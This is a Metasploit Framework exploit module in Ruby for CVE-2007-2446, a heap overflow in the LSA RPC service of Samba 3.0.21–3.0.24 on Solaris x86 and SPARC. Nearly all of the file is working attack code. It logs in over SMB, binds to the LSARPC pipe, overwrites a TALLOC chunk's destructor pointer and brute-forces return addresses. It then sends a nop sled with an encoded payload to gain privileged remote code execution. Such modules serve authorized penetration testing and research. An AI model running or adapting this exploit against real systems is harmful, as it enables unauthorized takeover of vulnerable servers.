##
# $Id: lsa_transnames_heap.rb 9021 2010-04-05 23:34:10Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Samba lsa_io_trans_names Heap Overflow',
			'Description'    => %q{
				This module triggers a heap overflow in the LSA RPC service
			of the Samba daemon. This module uses the TALLOC chunk overwrite
			method (credit Ramon and Adriano), which only works with Samba
			versions 3.0.21-3.0.24. Additionally, this module will not work
			when the Samba "log level" parameter is higher than "2".
			},
			'Author'         =>
				[
					'ramon',
					'Adriano Lima <adriano@risesecurity.org>',
					'hdm'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9021 $',
			'References'     =>
				[
					['CVE', '2007-2446'],
					['OSVDB', '34699'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
				},
			'Platform'       => 'solaris',
			'Targets'        =>
				[
					['Solaris 8/9/10 x86 Samba 3.0.21-3.0.24',
					{
						'Platform'      => 'solaris',
						'Arch'          => [ ARCH_X86 ],
						'Nops'          => 64 * 1024,
						'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x082f2000 },
								'Stop'  => { 'Ret' => 0x084f2000 },
								'Step'  => 60 * 1024,
							}
					}
					],
					['Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24',
					{
						'Platform'      => 'solaris',
						'Arch'          => [ ARCH_SPARC ],
						'Nops'          => 64 * 1024,
						'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0x00322000 },
								'Stop'  => { 'Ret' => 0x00722000 },
								'Step'  => 60 * 1024,
							}
					}
					],
					['DEBUG',
					{
						'Platform'      => 'solaris',
						'Arch'          => [ ARCH_X86 ],
						'Nops'          => 64 * 1024,
						'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0xaabbccdd },
								'Stop'  => { 'Ret' => 0xaabbccdd },
								'Step'  => 60 * 1024,
							}
					}
					],
				],
			'DisclosureDate' => 'May 14 2007',
			'DefaultTarget'  => 0
			))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
			], self.class)

	end

	# Need to perform target detection
	def autofilter
		false
	end

	def brute_exploit(target_addrs)

		if(not @nops)
			if (target['Nops'] > 0)
				print_status("Creating nop sled....")
				@nops = make_nops(target['Nops'])
			else
				@nops = ''
			end
		end

		print_status("Trying to exploit Samba with address 0x%.8x..." % target_addrs['Ret'])

		nops = @nops
		pipe = datastore['SMBPIPE'].downcase

		print_status("Connecting to the SMB service...")
		connect()
		smb_login()

		datastore['DCERPC::fake_bind_multi'] = false

		handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		num_entries  = 272
		num_entries2 = 288

		#
		# First talloc_chunk
		# 16 bits align
		# 16 bits sid_name_use
		#     16 bits uni_str_len
		#     16 bits uni_max_len
		#     32 bits buffer
		# 32 bits domain_idx
		#
		buf = (('A' * 16) * num_entries)

		# Padding
		buf << 'A' * 8

		# TALLOC_MAGIC
		talloc_magic = "\x70\xec\x14\xe8"

		# Second talloc_chunk header
		buf << 'A' * 8                         # next, prev
		buf << NDR.long(0) + NDR.long(0)       # parent, child
		buf << NDR.long(0)                     # refs
		buf << [target_addrs['Ret']].pack('V') # destructor
		buf << 'A' * 4                         # name
		buf << 'A' * 4                         # size
		buf << talloc_magic                    # flags

		stub = lsa_open_policy(dcerpc)

		stub << NDR.long(0)            # num_entries
		stub << NDR.long(0)            # ptr_sid_enum
		stub << NDR.long(num_entries)  # num_entries
		stub << NDR.long(0x20004)      # ptr_trans_names
		stub << NDR.long(num_entries2) # num_entries2
		stub << buf
		stub << nops
		stub << payload.encoded

		print_status("Calling the vulnerable function...")

		begin
			# LsarLookupSids
			dcerpc.call(0x0f, stub)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError
			print_status('Server did not respond, this is expected')
		rescue Rex::Proto::DCERPC::Exceptions::Fault
			print_error('Server is most likely patched...')
		rescue => e
			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
				print_status('Server disconnected, this is expected')
			else
				print_error("Error: #{e.class}: #{e}")
			end
		end

		handler
		disconnect
	end

	def lsa_open_policy(dcerpc, server="\\")
		stubdata =
			# Server
			NDR.uwstring(server) +
			# Object Attributes
				NDR.long(24) + # SIZE
				NDR.long(0)  + # LSPTR
				NDR.long(0)  + # NAME
				NDR.long(0)  + # ATTRS
				NDR.long(0)  + # SEC DES
					# LSA QOS PTR
					NDR.long(1)  + # Referent
					NDR.long(12) + # Length
					NDR.long(2)  + # Impersonation
					NDR.long(1)  + # Context Tracking
					NDR.long(0)  + # Effective Only
			# Access Mask
			NDR.long(0x02000000)

		res = dcerpc.call(6, stubdata)

		dcerpc.last_response.stub_data[0,20]
	end


end